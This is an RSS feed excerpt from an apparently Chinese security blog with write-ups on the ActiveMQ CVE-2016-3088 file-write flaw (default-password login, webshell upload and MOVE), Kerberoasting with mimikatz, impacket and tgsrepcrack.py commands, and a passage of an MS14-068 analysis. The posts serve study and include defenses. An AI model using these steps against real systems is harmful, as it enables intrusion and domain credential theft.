        <link>https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Activemq 任意文件写入漏洞" /&gt;&lt;h1 id=&#34;activemq-任意文件写入漏洞&#34;&gt;Activemq 任意文件写入漏洞&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;p&gt;ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，&lt;strong&gt;fileserver无需登录。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高，并且文件操作容易出现漏洞。&lt;/p&gt;
&lt;p&gt;所以，&lt;strong&gt;ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用&lt;/strong&gt;（可以在conf/jetty.xml中开启）；&lt;strong&gt;在5.14.0版本以后，彻底删除了fileserver应用。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞详情&#34;&gt;漏洞详情&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CVE-2016-3088&lt;/p&gt;
&lt;p&gt;本漏洞出现在fileserver应用中，本质就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。&lt;/p&gt;
&lt;p&gt;一般利用方式为写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。&lt;/p&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;p&gt;尝试写webshell，但是默认是不进行解析，所以如果有弱口令直接登录admin或api，将文件移动到可解析目录即可。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问8161端口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 235; 
			flex-basis: 565px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881.png&#34; data-size=&#34;1195x507&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881.png&#34;
			width=&#34;1195&#34;
			height=&#34;507&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881_huddc314303b8ed84e32c3faf677f7db70_74790_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881_huddc314303b8ed84e32c3faf677f7db70_74790_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问admin目录，尝试默认口令：admin:admin&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 127; 
			flex-basis: 307px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934.png&#34; data-size=&#34;481x376&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934.png&#34;
			width=&#34;481&#34;
			height=&#34;376&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934_hud222dc27c3c0e5950c05dce7f8905ce1_13338_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934_hud222dc27c3c0e5950c05dce7f8905ce1_13338_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 183; 
			flex-basis: 441px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513.png&#34; data-size=&#34;1205x655&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513.png&#34;
			width=&#34;1205&#34;
			height=&#34;655&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513_hufc60c43cb17945b42cebef919bcb6ba0_73649_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513_hufc60c43cb17945b42cebef919bcb6ba0_73649_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问&lt;code&gt;admin/test/systemProperties.jsp&lt;/code&gt;目录查看信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 166; 
			flex-basis: 399px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905.png&#34; data-size=&#34;1534x921&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905.png&#34;
			width=&#34;1534&#34;
			height=&#34;921&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905_hu4a3258ea4dac9e176d8122abb7e54dce_150870_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905_hu4a3258ea4dac9e176d8122abb7e54dce_150870_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用fileserver上传webshell&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 265; 
			flex-basis: 638px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008.png&#34; data-size=&#34;1532x576&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008.png&#34;
			width=&#34;1532&#34;
			height=&#34;576&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008_hufea9f3361adfb1b496d99dc49d87c9d8_132109_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008_hufea9f3361adfb1b496d99dc49d87c9d8_132109_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用MOVE方法移动到可解析的目录&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 412; 
			flex-basis: 988px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657.png&#34; data-size=&#34;1438x349&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657.png&#34;
			width=&#34;1438&#34;
			height=&#34;349&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657_hudf771f77e506b353c7061affd915bd33_102217_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657_hudf771f77e506b353c7061affd915bd33_102217_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问webshell，此时涉及到登录，添加HTTP basic Authorization头，蚁剑连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 557; 
			flex-basis: 1338px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701.png&#34; data-size=&#34;1483x266&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701.png&#34;
			width=&#34;1483&#34;
			height=&#34;266&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701_hu533ea7edd156051fabb7eaba9a10d440_63568_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701_hu533ea7edd156051fabb7eaba9a10d440_63568_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Kerberosating 攻击</title>
        <link>https://coollllllll.github.io/p/intranet-5/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-5/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-5/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Kerberosating 攻击" /&gt;&lt;h1 id=&#34;kerberosating-攻击&#34;&gt;Kerberosating 攻击&lt;/h1&gt;
&lt;h1 id=&#34;第九节-kerberosating攻击&#34;&gt;第九节-Kerberosating攻击&lt;/h1&gt;
&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
&lt;p&gt;Kerberoasting 攻击是 Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后，不少研究人员对 Kerberoasting 进行了改进和扩展，在 GitHub 上开发发布了大量工具，使得 Kerberoasting 逐渐发展成为域攻击的常用方法之一。&lt;/p&gt;
&lt;h2 id=&#34;攻击原理&#34;&gt;攻击原理&lt;/h2&gt;
&lt;p&gt;kerberos 协议的认证授权过程，3 次涉及使用不同账户的 NTLM 作为密钥加密数据：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用域用户的 NTLM 加密认证请求票据&lt;/li&gt;
&lt;li&gt;KDC 使用 Krbtgt 账号的 NTLM 加密认证后的票据 TGT&lt;/li&gt;
&lt;li&gt;KDC 使用运行服务的服务账号的 NTLM 加密授权票据 TGS&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Kerberos 使用公开的对称加密算法，如 rc4_hmac_nt 等:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;y = f(x, key)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;x为待加密的数据，包含时间戳和其它固定格式的内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;key为加密密钥，即 NTLM&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;y 为加密后的密数据&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;如果能从 Kerberos 域网络中获取 y，则根据已知算法，使用不同的 f，并配合口令字典可推算出不同的 x。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于 x中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的 key 是否为要寻找的口令。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;key 越简单、加密算法 f强度越低，被破解的概率越大，因此需要寻找具有简单 key的账号，以及使用较低强度的加密算法 f。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;域内账号类型&#34;&gt;域内账号类型&lt;/h2&gt;
&lt;p&gt;在域内主要有&lt;code&gt;主机账号&lt;/code&gt;、&lt;code&gt;用户账号&lt;/code&gt;、&lt;code&gt;服务账号&lt;/code&gt;(SPN 注册在域用户账号下)  3 种主要账号类型。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主机账号的口令由系统随机设置，几乎不能破解，而且每 &lt;code&gt;30&lt;/code&gt; 天自动变更一次&lt;/li&gt;
&lt;li&gt;用户账号口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大&lt;/li&gt;
&lt;li&gt;服务账号的口令存在很大特殊性
&lt;ul&gt;
&lt;li&gt;口令在应用软件安装时往往自动设定，复杂度往往较低&lt;/li&gt;
&lt;li&gt;口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行 &lt;strong&gt;MSSQL服务的 sqlsvc 账号&lt;/strong&gt;等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务账号满足口令复杂度较低这个条件，可以作为破解的对象。&lt;/p&gt;
&lt;p&gt;要想达成破解条件，还需要获取加密后的数据，则需获取服务账号的密数据：&lt;/p&gt;
&lt;p&gt;由于 &lt;code&gt;TGS&lt;/code&gt; 由服务账号的 &lt;code&gt;NTLM&lt;/code&gt; 加密，因此获取访问服务的 &lt;code&gt;TGS&lt;/code&gt; 即可获取密数据，即 &lt;code&gt;Kerberos&lt;/code&gt; 协议中的第 4 步。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;根据 Kerberos 协议，任何用户均可以向域服务器申请访问某个服务；而&lt;code&gt;TGS&lt;/code&gt;的获取是前四步，server不参与，因此该服务可以不在线，只要该服务在域中注册了 &lt;code&gt;SPN(Service Principal Name)&lt;/code&gt; 即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;spn&#34;&gt;SPN&lt;/h2&gt;
&lt;h3 id=&#34;简介&#34;&gt;简介&lt;/h3&gt;
&lt;p&gt;SPN 是服务器上所运行服务的唯一标识，每个使用 Kerberos 的服务都需要一个 SPN。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SPN 分为两种：一种注册在 AD 上**机器帐户(Computers)&lt;strong&gt;下，另一种注册在域&lt;/strong&gt;用户帐户(Users)**下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当一个服务的权限为 &lt;code&gt;Local System&lt;/code&gt; 或 &lt;code&gt;Network Service&lt;/code&gt;，则 SPN 注册在机器帐户(Computers)下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当一个服务的&lt;strong&gt;权限为一个域用户&lt;/strong&gt;，则 SPN 注册在域用户帐户(Users)下&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SPN的格式：&lt;code&gt;serviceclass/host:port/servicename&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;其中 serviceclass 表示服务的种类，例如 www 表示web服务&lt;/li&gt;
&lt;li&gt;host 尽量用 FQDN 表示&lt;/li&gt;
&lt;li&gt;端口如果是知名端口，可以省略&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如&lt;code&gt;MSSQL&lt;/code&gt;服务：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 95; 
			flex-basis: 228px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220211913981.png&#34; data-size=&#34;351x368&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220211913981.png&#34;
			width=&#34;351&#34;
			height=&#34;368&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220211913981_hud2e2db60a608d5ace4fec1d4c013bf15_89149_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-5/image-20220220211913981_hud2e2db60a608d5ace4fec1d4c013bf15_89149_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;查询spn账号&#34;&gt;查询SPN账号&lt;/h3&gt;
&lt;p&gt;SPN 存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有 SPN 服务。因为主机账号的口令几乎不能破解，所以只查询用户账号的 SPN。&lt;/p&gt;
&lt;p&gt;系统提供了 PowerShell 模块供查询，PowerViewer 对模块进行了封装，提供 &lt;code&gt;Get-DomainUser -SPN&lt;/code&gt; 命令，可遍历域内所有的用户账号的 SPN。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 816; 
			flex-basis: 1959px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220212635819.png&#34; data-size=&#34;751x92&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220212635819.png&#34;
			width=&#34;751&#34;
			height=&#34;92&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220212635819_hu03ffc04e653bb2a60c86a52e3fa48d3c_3591_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-5/image-20220220212635819_hu03ffc04e653bb2a60c86a52e3fa48d3c_3591_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Win7 和 Windows Server 2008 自带的工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;setspn.exe -q */*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一些域中，当一些服务不再运行或者停止服务后，这些服务账号可能仍然遗留在域中，由于服务的运行与否不影响获取 &lt;code&gt;TGS&lt;/code&gt;，因此这些不存在的 &lt;code&gt;SPN&lt;/code&gt; 仍然适用于 &lt;code&gt;Kerberoasting&lt;/code&gt;。例如：Exchange。&lt;/p&gt;
&lt;p&gt;服务账号中有些权限较高，例如有些特殊的服务需要&lt;strong&gt;具备域管理员权限的服务账号&lt;/strong&gt;才能运行正常，因此可以在查询 SPN 时加以标记和筛选，作为重点攻击的对象。方法是在使用 &lt;code&gt;Get-DomainUser -SPN&lt;/code&gt; 命令时，添加 &lt;code&gt;AdminCount&lt;/code&gt; 参数，表示具备高权限。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 603; 
			flex-basis: 1448px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220213511559.png&#34; data-size=&#34;887x147&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220213511559.png&#34;
			width=&#34;887&#34;
			height=&#34;147&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220213511559_hu2c5565cfda2616f053629349668b8c07_155943_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-5/image-20220220213511559_hu2c5565cfda2616f053629349668b8c07_155943_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;攻击&#34;&gt;攻击&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;获取域内服务账号与所运行的服务的对应关系&lt;/li&gt;
&lt;li&gt;获取访问这些服务的TGS，即获取由服务账号 NTLM 加密的加密数据，使用mimikatz工具的Kerberos 模块的 &lt;code&gt;ask&lt;/code&gt; 命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 223; 
			flex-basis: 535px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220214036354.png&#34; data-size=&#34;799x358&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220214036354.png&#34;
			width=&#34;799&#34;
			height=&#34;358&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-5/image-20220220214036354_hu9b2b23fb82ae8545f3e42b1c24eeecd7_306389_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-5/image-20220220214036354_hu9b2b23fb82ae8545f3e42b1c24eeecd7_306389_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;Mimikatz&lt;/code&gt; 每次只能申请获取一个 &lt;code&gt;TGS&lt;/code&gt;，&lt;code&gt;impacket&lt;/code&gt; 工具包提供了批量获取的方法，可一次获取域内所有 &lt;code&gt;SPN&lt;/code&gt; 的 &lt;code&gt;TGS&lt;/code&gt;，供离线批量破解。&lt;/p&gt;
&lt;p&gt;微软为了解决系统新旧版本兼容性问题，每个 Windows 系统会支持多种加密算法，例如 &lt;code&gt;AES、DES、RC4、MD5&lt;/code&gt; 等。在 &lt;code&gt;Windows 2003、Windows 2000&lt;/code&gt; 系统中，主要采用 &lt;code&gt;RC4、MD5、HMAC_MD5&lt;/code&gt; 等算法，这些算法相对比较容易破解。所以在选择破解重点时，尽量选取运行在这些系统上的服务。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有多种方式迫使系统选择使用强度较低的加密算法。现在比较容易破解的算法是 &lt;code&gt;RC4_HMAC_NT&lt;/code&gt; 算法，在获取 &lt;code&gt;TGS&lt;/code&gt; 时，可以诱使域服务器采用该算法进行加密。例如mimikatz工具就会告诉KDC我所支持的加密算法就是&lt;code&gt;RC4_HMAC_NT&lt;/code&gt; 等，诱使域服务器采用该算法进行加密。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;Kerberoasting 攻击的所有条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密数据&lt;/li&gt;
&lt;li&gt;算法&lt;/li&gt;
&lt;li&gt;口令字典库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tim Medin 的 kerberoast 工具破解获取口令，使用 &lt;code&gt;tgsrepcrack.py wordlist.txt tgs.kirbi&lt;/code&gt; 进行破解，其中 wordlist.txt 是字典文件，&lt;code&gt;tgs.kirbi&lt;/code&gt; 是之前获取的 &lt;code&gt;TGS&lt;/code&gt;。破解的概率和时间依赖于口令复杂度、字典以及机器的性能。&lt;/p&gt;
&lt;p&gt;当然还有算法更快的 HashCat 工具。&lt;/p&gt;
&lt;h3 id=&#34;kerberoasting-攻击后续&#34;&gt;Kerberoasting 攻击后续&lt;/h3&gt;
&lt;p&gt;破解所服务账号的口令后，接下来就是如何利用账号实现对域的控制。&lt;/p&gt;
&lt;p&gt;默认情况下，服务账号不允许以交互式方式登录域，只允许网络登录或以服务方式登录。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果服务账号对应服务仍在正常使用，可&lt;strong&gt;构造类似白银票据进行伪造TGS&lt;/strong&gt;，宣称以管理员访问服务账号所在的服务，进而获取该服务完全控制权&lt;/li&gt;
&lt;li&gt;如果对应服务不存在，往往要使用服务账号访问其他服务，一般也可获取高权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在Windows系统中，许多服务在服务器具有较高权限。例如MSSQL服务在服务器上具有本地管理员权限，如果以域管理员身份访问该服务，既可以控制服务本身，又可获取服务器本地管理员权限，并且，在这类服务器上，往往也留有高权限用户的登录凭证，获取这些凭证进而快速获取域控制权。&lt;/p&gt;
&lt;h3 id=&#34;kerberoasting-攻击例外&#34;&gt;Kerberoasting 攻击例外&lt;/h3&gt;
&lt;p&gt;有时候存在这样的账号，他&lt;strong&gt;不要求进行Kerberos预身份验证&lt;/strong&gt;，那么根据TGS密数据去破解口令的方式不适用，但是这类账户可能也有弱口令现象，同样可使用Kerberoasting破解用户账号口令。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可使用ARP欺骗，获取用户登录时的AS-REP包，然后离线破解&lt;/strong&gt;。之所以要在用户登录时窃听，是因为根据Kerberos协议，使用用户NTLM进行加密的情景只出现在用户登录认证时候。&lt;/p&gt;
&lt;h2 id=&#34;防御&#34;&gt;防御&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;提高服务账号的口令复杂度&lt;/li&gt;
&lt;li&gt;尽量将域内的服务器系统升级至少至 windows2008 系统，应用 AES256 高难度的加密算法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;检测Kerberoasting 攻击还是比较困难，因为执行攻击所做的操作都是合法常规操作。但也可从以下方面进行检测：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;批量获取 TGS&lt;/li&gt;
&lt;li&gt;声明使用低强度的加密算法&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>MS14-068 漏洞分析</title>
        <link>https://coollllllll.github.io/p/intranet-9/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-9/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-9/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post MS14-068 漏洞分析" /&gt;&lt;h1 id=&#34;ms14-068-漏洞分析&#34;&gt;MS14-068 漏洞分析&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;p&gt;2014.11.18 日，微软发布 MS14-068 补丁，修复了一个影响全部版本 Windows 服务器的严重漏洞。用于解决 Microsoft Windows Kerberos KDC 漏洞，该漏洞允许黑客任意普通用户提升权限成为域管理员身份。攻击者可以利用这些提升的权限控制域中所有的计算机，包括域服务器。&lt;/p&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;h3 id=&#34;kerberos-认证流程&#34;&gt;Kerberos 认证流程&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 163; 
			flex-basis: 392px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301200717914.png&#34; data-size=&#34;1490x910&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301200717914.png&#34;
			width=&#34;1490&#34;
			height=&#34;910&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301200717914_hub9d474f01ade6b02015eca07fb6e36a3_522987_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-9/image-20220301200717914_hub9d474f01ade6b02015eca07fb6e36a3_522987_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Server如何判断Client的该有什么样的权限？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Server 收到 Client 发来的 TGS 后，要根据 TGS 中 Client 申明所在的域组，和 Server 上的 ACL 进行比对，然后决定给予 Client 什么样的资源访问权限。微软使用 PAC 来表示 TGS 中 Client 申明的域组。&lt;/p&gt;
&lt;h3 id=&#34;pac&#34;&gt;PAC&lt;/h3&gt;
&lt;p&gt;PAC (Privilege Attribute Certificate)，特权属性证书。PAC 包含 Client 的 &lt;code&gt;User 的 SID&lt;/code&gt;、&lt;code&gt;Group 的 SID&lt;/code&gt;。PAC 决定了 Client 的组属性，即决定了 Client 的权限。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PAC 中 Group 的 SID 决定了 Client 权限。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;PAC 为了保证自身的合法性，还包含 2 个签名，Key 为 krbtgt 的 NTLM，签名的内容除了 &lt;code&gt;User SID、Group SID&lt;/code&gt; 外，还包括其他部分。&lt;/p&gt;
&lt;p&gt;PAC 作为 TGT 的一部分，是加密的，密钥为 krbtgt 的 NTLM。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 128; 
			flex-basis: 308px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301203107524.png&#34; data-size=&#34;1295x1008&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301203107524.png&#34;
			width=&#34;1295&#34;
			height=&#34;1008&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-9/image-20220301203107524_hufa07d1bf47ecc622f14eecd308f2f24f_892912_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-9/image-20220301203107524_hufa07d1bf47ecc622f14eecd308f2f24f_892912_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
